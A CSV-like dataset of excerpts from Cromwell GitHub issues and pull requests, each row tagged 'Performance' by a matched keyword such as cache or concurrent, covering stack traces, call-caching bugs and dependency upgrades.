Performance,BackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:619); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:627); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1108); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1104); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4920:1590,concurren,concurrent,1590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4920,2,['concurren'],['concurrent']
Performance,BackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); `; [sampleData_gatk-sample-out_logging_output (3).txt](https://github.com/broadinstitute/cromwell/files/2774220/sampleData_gatk-sample-out_logging_output.3.txt),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:3110,concurren,concurrent,3110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['concurren'],['concurrent']
Performance,Balance log messages with performance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807:26,perform,performance,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807,1,['perform'],['performance']
Performance,Based on new security/permissions requirements there is a need to add extra functionality to HtCondor backend. Basically the functionality should provide a way to link cached file / array of files outputs to the current workflow execution. All paths should point to current workflow execution dir.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1425:168,cache,cached,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1425,1,['cache'],['cached']
Performance,"Based on the travis test failures -- it seems the `write_lines` centaur tests has a draft3 and a draft2 version and they can end up caching to each other. AC: Either change the test cases so they won't cache to each other, or ensure that `read_from_cache()` is set to false.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4058:202,cache,cache,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4058,1,['cache'],['cache']
Performance,"Basic Expectations: ; Run a bunch of workflows (call caching turned off) → mid-way to completion, Upgrade → ; a) All running workflows succeed; b) Cromwell can connect to pre-existing operation ids (aka it completed within attempt 1). Run a bunch of workflows → Run them again to see they successfully cached once → upgrade → run them again to ensure they’re still caching. “Upgrade” consists of a new Cromwell Jar, and also a new Cromwell config (with the latest additions being used). Key features that shouldn’t break:; Log names (detritus files) don’t change (before and after), and if yes, then print a warning; Streaming logs (before and after), else error; Caching (before and after), else error; Job success (before and after), else error",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4101:302,cache,cached,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4101,1,['cache'],['cached']
Performance,"Basic Expectations:; Run a bunch of workflows (call caching turned off) → mid-way to completion, Upgrade →; a) All running workflows succeed; b) Cromwell can connect to pre-existing operation ids (aka it completed within attempt 1). Run a bunch of workflows → Run them again to see they successfully cached once → upgrade → run them again to ensure they’re still caching. “Upgrade” consists of a new Cromwell Jar, and also a new Cromwell config (with the latest additions being used). Key features that shouldn’t break:; - ~Log names (detritus files) don’t change (before and after), and if yes, then print a warning~ Split into Issue: #4188; - ~Streaming logs (before and after), else error~ Split into Issue: #4187; - ~Caching (before and after), else error~ PR merged: #4178; - ~Job success (before and after), else error~ PR merged: #4132",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4099:300,cache,cached,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4099,1,['cache'],['cached']
Performance,"BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""sta",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6383,concurren,concurrent,6383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"BatchingExecutor.scala:91); 9621 at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 9622 at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 9623 at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 9624 at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 9625 at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 9626 at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 9627 at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 9628 at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 9629 at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 9630 ; 9631 2018-06-06 11:02:59,840 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowManagerActor WorkflowActor-c9dfd3ed-8be8-413f-af46-4692142b3248 is in a terminal state: WorkflowFailedState; 9632 - should successfully run jointdiscovery *** FAILED *** (2 hours, 13 minutes, 31 seconds); 9633 java.lang.Exception: Unexpected terminal status Failed but was waiting for Succeeded; 9634 at centaur.test.Operations$$anon$9.doPerform(Test.scala:185); 9635 at centaur.test.Operations$$anon$9.$anonfun$run$7(Test.scala:200); 9636 at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:654); 9637 at scala.util.Success.$anonfun$map$1(Try.scala:251); 9638 at scala.util.Success.map(Try.scala:209); 9639 at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); 9640 at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); 9641 at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); 9642 at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 9643 at java.util.concurrent.ForkJoinTask$RunnableExecuteAction.exec(ForkJoinTask.java:1402); 9644 ...; ```. NOTE: Preemption has since been disabled in Travis due to CRON builds being terminated after three hours.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3732:3930,concurren,concurrent,3930,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3732,6,['concurren'],['concurrent']
Performance,Because sometimes things other than cromwell can cancel jobs. Also might make restarts after aborts a little more resilient in case of unexpected race conditions (not a guarantee TM),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2503:146,race condition,race conditions,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2503,1,['race condition'],['race conditions']
Performance,"Because writing to the call caching store and the job store is not atomic, the following chain of events is possible and not necessarily desirable:. - A job start; - A cache hit is found; - The outputs are copied; - The hashes / simpletons are written to the DB; - ** Cromwell Stops **: This is after the hashes are written successfully but before the EJEA had a chance to write the outputs to the job store and mark the job as complete.; - Cromwell starts; - The workflow is restarted; - The job is not found in the job store; - At this point the EJEA has a state to check if there are hashes existing for this job already. If there is, it disables call caching (so that the EJEA doesn't try to call cache to himself, and that we don't write to the hash store again - which would fail because of the unique index in the call cache table).; - However since we've disabled call caching we then proceed to try and recover the job, which fails because it was never run (since we found a cache hit the first time), and then falls back to running the job for reals. This is not great because this job already has all the outputs it needs, files have been copied already, but we run the job on top of it, which seems to increase the likelihood of having empty files at least locally when trying to read outputs and cause `cannot create an Int from """"` types of failures. Maybe a better way would be to re-use the outputs that have been written to the cache to make the job succeed and bypass all the rest. Relevant code in the EJEA: https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L153",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3074:168,cache,cache,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3074,5,['cache'],['cache']
Performance,"Before #3978 the entire workflow would be stuck ""running"" forever.; With that change the workflow will complete, but the Call Cache fetch is still failing when it shouldn't be",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3979:126,Cache,Cache,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3979,1,['Cache'],['Cache']
Performance,"Before cromwell uses a previously cached call it needs to know if the docker image content has changed. Some images such as the [GATK](https://hub.docker.com/r/broadinstitute/gatk/tags/) are so large that they must not be pulled at scale from DockerHub. Instead these images be hosted elsewhere per cloud service provider, including [ECR](https://aws.amazon.com/ecr/). A/C: When call references an image in ECR cromwell should contact ECR to get and record the image hash.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3822:34,cache,cached,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3822,1,['cache'],['cached']
Performance,"Before releasing a jar, run it on a different database. Test that the liquid-base scripts work. ; Ask each time. . Standup database, load data in. Migrate. Start running workflows and see if it works.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2110:133,load,load,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2110,1,['load'],['load']
Performance,"Before the break I was playing around trying to async-ify Cromwell's IO a bit more. It's not complete and needs clean up / refinements / tests, but considering that one of the goals is reliability/scalability, I thought I'd make a PR out of it since it might provide a base for discussion. This branch has an IO Actor that handles *some* of the IO that has to be done both on the engine and the backend side. Specifically the script.sh upload, rc file reading, stderr file size reading, call cache copying (on JES), workflow outputs copying is done using this mechanism.; The actor is under the service registry umbrella, that was to be able to test it more rapidly (as the service registry is already wired up pretty much everywhere), but it should probably be it's own top level actor. Due to the Future-based approach we took in the backend interface, the IO messages (copy, read, write, delete file...) are declined into 2 different flavors:; - A classic Command -> Response; - A Promise based version, that takes a promise in the command message itself to be completed when the operation finishes. This allow for the actor to integrate with parts of the code that can't (easily) handle the response as a message. The underlying implementation of the IO Actor is a router, but could be swapped for something else. Each worker tries to perform the operation, and once it's complete (successfully or not) either sends a message back or completes the promise depending on the command flavor.; Retries are handled by keeping an exponential backoff object in the command itself. If the failure is retryable, the worker sends the command message back to the router after waiting for the appropriate backoff time. The message will then be rerouted when a worker is available.; Note that the actual time before the command is picked up again by another worker could be longer than intended if all workers are busy and the command spends time in the mailbox. ; A command will be retried as many times as po",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1831:197,scalab,scalability,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1831,2,"['cache', 'scalab']","['cache', 'scalability']"
Performance,"Better ""no metadata found"" errors for call cache diffs [BA-6106]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5260:43,cache,cache,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5260,1,['cache'],['cache']
Performance,"Blacklists individual cache hits that fail copying for whatever reason. This is in addition to the existing bucket-based 403 blacklisting, not instead of it. Needs tests and docs. Apologies for the diff noise of `CallCachingEntryId` changing subprojects. I would also like to rename this type at some point but I'm holding off for now since that would create even more noise.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5513:22,cache,cache,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5513,1,['cache'],['cache']
Performance,Build 3730. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 210 times over 3.3499629773500006 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:255,concurren,concurrent,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,3,['concurren'],['concurrent']
Performance,"Bump to [~3.2.1~ 3.2.2 patch version](http://slick.lightbend.com/news/2017/07/20/slick-3.2.1-released.html) that may help with this problem:. ```; Exception in thread ""db-10602"" java.lang.IllegalArgumentException: requirement failed: count cannot be decreased; at scala.Predef$.require(Predef.scala:277); at slick.util.ManagedArrayBlockingQueue.$anonfun$decreaseInUseCount$1(ManagedArrayBlockingQueue.scala:53); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at slick.util.ManagedArrayBlockingQueue.slick$util$ManagedArrayBlockingQueue$$locked(ManagedArrayBlockingQueue.scala:217); at slick.util.ManagedArrayBlockingQueue.decreaseInUseCount(ManagedArrayBlockingQueue.scala:52); at slick.util.AsyncExecutor$$anon$2$$anon$1.afterExecute(AsyncExecutor.scala:87); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1157); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```. Most of the changes in this PR are for the default length of strings in Slick going from 255 to 16777216 in this patch release (!)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3414:801,concurren,concurrent,801,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3414,2,['concurren'],['concurrent']
Performance,"Bumped `liquibase-core` version to latest `3.5.1` that fixes among other things a `ConcurrentModificationException` (see liquibase pull 539).; Moved cromwell specific liquibase diff filtering out of (hopefully someday) common `DiffResultFilter`.; Now filtering new ""order"" differences.; Prettier printing of liquibase/slick differences in `SlickDatabaseSpec`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/974:83,Concurren,ConcurrentModificationException,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/974,1,['Concurren'],['ConcurrentModificationException']
Performance,CROM-6887 Store the correct metadata for call cache detritus,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6763:46,cache,cache,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6763,1,['cache'],['cache']
Performance,CWL Cache miss,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3782:4,Cache,Cache,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3782,1,['Cache'],['Cache']
Performance,CWL restart problem when reading from cache -- unrecognized simpleton WOM type: Long,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4023:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4023,2,['cache'],['cache']
Performance,Cache Hit copy failures with RP,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4771:0,Cache,Cache,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4771,1,['Cache'],['Cache']
Performance,Cache coursier in travis,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3041:0,Cache,Cache,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3041,1,['Cache'],['Cache']
Performance,Cache existence of workflows in MetadataServiceActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/962:0,Cache,Cache,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/962,1,['Cache'],['Cache']
Performance,Cache output copy failures,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4091:0,Cache,Cache,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4091,1,['Cache'],['Cache']
Performance,Cache read + restart perhaps not ideal,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441:0,Cache,Cache,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441,1,['Cache'],['Cache']
Performance,Cached-copy localization strategy is broken in Cromwell 51,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533:0,Cache,Cached-copy,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533,1,['Cache'],['Cached-copy']
Performance,Call Cache the Scatter Workflow in #1534,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1535:5,Cache,Cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1535,1,['Cache'],['Cache']
Performance,Call cache blacklist grouping support [BA-6427],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5512:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5512,1,['cache'],['cache']
Performance,Call cache blacklisting,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4359:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4359,1,['cache'],['cache']
Performance,Call cache capoeira for 1.0 (plus ensure task hashes match draft-2),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3653:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3653,1,['cache'],['cache']
Performance,Call cache copying infrastructure,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1365:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1365,1,['cache'],['cache']
Performance,Call cache diffing broken for scattered calls in carbonited workflows [BT-62],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6144:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144,1,['cache'],['cache']
Performance,Call cache diffing did end up being written against metadata so what this ticket is asking for is no longer needed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-326085665:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-326085665,1,['cache'],['cache']
Performance,Call cache hits sometimes fail while copying outputs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1444:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1444,1,['cache'],['cache']
Performance,"Call cache misses, maybe due to race condition",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1995:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1995,2,"['cache', 'race condition']","['cache', 'race condition']"
Performance,Call cache no copy fixups and centaur error improvements,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4951:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4951,1,['cache'],['cache']
Performance,Call caching hashing rebased on Call Cache reading,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1291:37,Cache,Cache,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1291,1,['Cache'],['Cache']
Performance,Call caching should fall back to running the task if cached files don't exist,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1347:53,cache,cached,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1347,1,['cache'],['cached']
Performance,"Call caching should verify that cached files exist before coping, and if they don’t then fall back to running the task. In FireCloud, users may delete files out of their bucket. If a cache hit occurs, it should check that the files to be copied exist. And if they don't Cromwell should fall back to just running the task as if a call cache hit didn't occur. Bonus points: should we then make that call ineligible for caching going forward?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1347:32,cache,cached,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1347,3,['cache'],"['cache', 'cached']"
Performance,"Call caching works sometimes for me but not all the time. I find it especially strange when working on a scatter job and some of the scatter jobs get a cache hit but others get a cache miss. . I have queried the METADATA_ENTRY table for the two workflows and all the call cache entries look identical. . Here is my process:. 1. I queried METADATA_ENTRY with this WHERE condition: `(WORKFLOW_EXECUTION_UUID ='29791b64-b47a-44ba-aff0-7ab48bc10677' or WORKFLOW_EXECUTION_UUID ='5de042e3-7a03-4c77-8972-f0e4cd010e4b') and CALL_FQN = 'sampleLevelWorkflow_WGS.align' and JOB_SCATTER_INDEX =0`; 2. I sort by METADATA_KEY; 3. Then I go down the list and compare the hashes for the two workflows for each METADATA_KEY. Here is a case where workflow 29791b64 is a restart of 5de042e3. (Workflow 5de042e3 is itself a restart but I don't think that is important here.) I have shown below all the records from METADATA_ENTRY that start with ""callCaching"" and they all look identical, yet it clearly says it is a ""Cache Miss"". **Is there anywhere I can see a log message stating exactly which hashes resulted in the cache miss?** I have tried to enable LOG_LEVEL=DEBUG but couldn't see it there. Thanks in advance for your help!. |WORKFLOW_EXECUTION_UUID|METADATA_KEY|METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; 